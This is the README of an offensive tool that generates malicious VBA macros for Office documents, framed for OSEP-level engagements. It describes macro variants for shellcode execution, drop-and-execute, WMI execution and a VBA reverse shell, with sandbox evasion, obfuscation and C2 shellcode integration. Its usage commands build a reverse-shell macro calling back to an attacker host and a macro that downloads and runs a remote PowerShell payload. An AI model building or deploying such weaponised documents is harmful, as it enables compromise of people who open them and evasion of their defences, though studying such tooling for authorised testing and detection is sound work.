# MacroGen

A comprehensive VBA macro generator for Microsoft Office documents, specifically designed for OSEP-level engagements. It simplifies the creation of malicious macros using various techniques to bypass detection and achieve code execution.

## Macro Types
- **vba-classic**: Standard WinAPI shellcode execution.
- **vba-ps1**: Executes a PowerShell command or script.
- **vba-exe**: Drops and executes an executable.
- **vba-wmi**: Uses WMI to achieve code execution.
- **vba-wmi-sf**: Stealthy WMI-based execution.
- **vba-msf**: Direct MSFvenom shellcode integration.
- **vba-rev**: A pure VBA-based reverse shell.
- **vba-advanced**: Advanced techniques with improved evasion.

## Features
- **MSF/Sliver Integration**: Automatically generates shellcode for major C2 frameworks.
- **Sandbox Evasion**: Optional checks for specific filenames or environment artifacts to prevent execution in analysis environments.
- **Obfuscation**: Minimalistic VBA obfuscation to reduce static analysis signatures.

## Usage
Generate a classic WinAPI-based macro with an MSF reverse shell:
```bash
python3 MacroGen.py --type vba-classic --payload msf --lhost 10.10.10.10 --lport 443
```

Create a macro that downloads and executes a PowerShell script:
```bash
python3 MacroGen.py --type vba-ps1 --remote-url "http://10.10.10.10/payload.ps1"
```

### Arguments
- `--type`: Specifies the macro execution method.
- `--payload`: Choose between `msf`, `sliver`, or `pty-win`.
- `--bin`: Path to a raw shellcode binary file.
- `--lhost/--lport`: Local network configuration.
- `--remote-url`: Remote URL for PowerShell-based macros.

## Modules
- **modules/macros/**: Contains the logic for the different macro types.
- **modules/payloads/**: Contains logic for generating shellcode using external tools.
- **modules/core/**: Utility functions for the generator.
